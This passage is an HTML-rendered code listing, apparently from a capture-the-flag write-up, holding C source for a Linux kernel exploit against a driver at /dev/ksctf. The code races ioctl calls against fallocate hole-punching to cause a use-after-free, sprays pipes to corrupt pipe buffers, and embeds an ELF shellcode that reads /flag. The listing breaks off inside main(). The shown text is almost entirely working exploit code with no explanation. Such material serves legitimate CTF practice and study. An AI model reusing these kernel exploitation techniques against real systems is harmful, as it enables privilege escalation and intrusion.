class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc exp.c --static -masm=intel -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *msg;</span><br><span class="line">    <span class="type">uint64_t</span> a;</span><br><span class="line">    <span class="type">uint64_t</span> b;</span><br><span class="line">    <span class="type">uint64_t</span> c;</span><br><span class="line">    <span class="type">uint64_t</span> d;</span><br><span class="line">    <span class="type">uint64_t</span> e;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">vuln</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_PIPE_COUNT 0x50</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SECONDARY_PIPE_COUNT 0x150</span></span><br><span class="line"><span class="type">int</span> pipe_fd[MAX_PIPE_COUNT][<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> already_read[MAX_PIPE_COUNT];</span><br><span class="line"><span class="type">int</span> snd_pipe_fd[MAX_SECONDARY_PIPE_COUNT][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_pipes</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> cnt)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *buf[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] enter %s start from index: %d\n&quot;</span>, __PRETTY_FUNCTION__, start);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = start; i &lt; cnt; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;create pipe&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_pipes2</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *buf[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] enter %s\n&quot;</span>, __PRETTY_FUNCTION__);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_SECONDARY_PIPE_COUNT; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(snd_pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;create pipe&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (fcntl(snd_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;resize pipe&quot;</span>);    </span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">char</span> v14[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin add.&quot;</span>);</span><br><span class="line">    vuln.e = (<span class="type">size_t</span>)v14;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF0</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Add success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin delete&quot;</span>);</span><br><span class="line">    vuln.e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF1</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Delete success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> shm_id;</span><br><span class="line"><span class="comment">// SYNC</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sync_s</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> x1;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> x2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> x3;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> x4;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sync_s</span> *<span class="title">sync_s</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMAP_ADDR ((void *)0xdead0000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TARGET_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TARGET_PAGES (TARGET_SIZE / 0x8 - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// PUNCHING HOLE</span></span><br><span class="line"><span class="type">int</span> mfd;</span><br><span class="line"><span class="type">size_t</span> shmem_sz = (<span class="number">0x1000</span> * <span class="number">0xa</span>) * PAGE_SIZE;</span><br><span class="line"><span class="type">int</span> <span class="title function_">punch_hole_prepare</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    mfd = memfd_create(<span class="string">&quot;x&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mfd == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;memfd_create failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *addr = mmap(MMAP_ADDR, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, mfd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (addr != MMAP_ADDR) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;mmap failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = fallocate(mfd, <span class="number">0</span>, <span class="number">0</span>, shmem_sz);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;fallocate failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;fallocate success&quot;</span>);</span><br><span class="line">    <span class="type">void</span> *addr2 = mmap(MMAP_ADDR + PAGE_SIZE, PAGE_SIZE * TARGET_PAGES, PROT_READ | PROT_WRITE,</span><br><span class="line">                       MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (addr2 != MMAP_ADDR + PAGE_SIZE) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;mmap failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">trigger_punch_hole</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> tmp;</span><br><span class="line">    <span class="keyword">while</span> (!sync_s-&gt;x1)</span><br><span class="line">        ;</span><br><span class="line">    info(<span class="string">&quot;trigger_punch_hole&quot;</span>);</span><br><span class="line">    sync_s-&gt;x2 = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> ret = fallocate(mfd, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE, <span class="number">0</span>, shmem_sz);</span><br><span class="line">    <span class="keyword">if</span>(ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;fallocate&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete_fd</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (!sync_s-&gt;x3)</span><br><span class="line">        ;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] trigger uaf\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    spray_pipes(<span class="number">0x10</span>, MAX_PIPE_COUNT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0x10</span>; i &lt; MAX_PIPE_COUNT; ++i) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> k = i;</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;writesth&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;Qanux&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;Qanux&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    del();</span><br><span class="line"></span><br><span class="line">    spray_pipes(<span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> k = i;</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;writesth&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;Qanux&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;Qanux&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">triger_vuln</span><span class="params">()</span>&#123;</span><br><span class="line">    sync_s-&gt;x1 = <span class="number">1</span>;</span><br><span class="line">    add();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!(sync_s-&gt;x2))</span><br><span class="line">        ;</span><br><span class="line">    info(<span class="string">&quot;triger_vuln&quot;</span>);</span><br><span class="line">    sync_s-&gt;x3 = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(write(fd, MMAP_ADDR, <span class="number">0x1</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;write&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    info(<span class="string">&quot;triger_done&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = &#123;</span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x45</span>, <span class="number">0x4c</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3e</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x97</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x97</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xbf</span>, <span class="number">0x2f</span>, <span class="number">0x66</span>, <span class="number">0x6c</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x57</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc0</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x89</span>, <span class="number">0xc7</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc2</span>, <span class="number">0x00</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0xb8</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xbf</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x00</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ksctf&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    vuln.msg = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">memset</span>(vuln.msg, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> t1, t2, t3;</span><br><span class="line">    shm_id = shmget(IPC_PRIVATE, <span class="number">0x1000</span>, IPC_CREAT | <span class="number">0666</span>);</span><br><span class="line">    <span class="keyword">if</span> (shm_id &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;shmget&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sync_s = (<span class="keyword">struct</span> sync_s *)shmat(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    punch_hole_prepare();</span><br><span class="line">    pthread_create(&amp;t1, <span class="number">0</span>, triger_vuln, <span class="number">0</span>);</span><br><span class="line">    pthread_create(&amp;t2, <span class="number">0</span>, trigger_punch_hole, <span class="number">0</span>);</span><br><span class="line">    pthread_create(&amp;t3, <span class="number">0</span>, delete_fd, <span class="number">0</span>);</span><br><span class="line">    pthread_join(t1, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(t2, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(t3, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// try to find corrupted pipe_buf</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] finding corrupted page\n&quot;</span>);</span><br><span class="line">    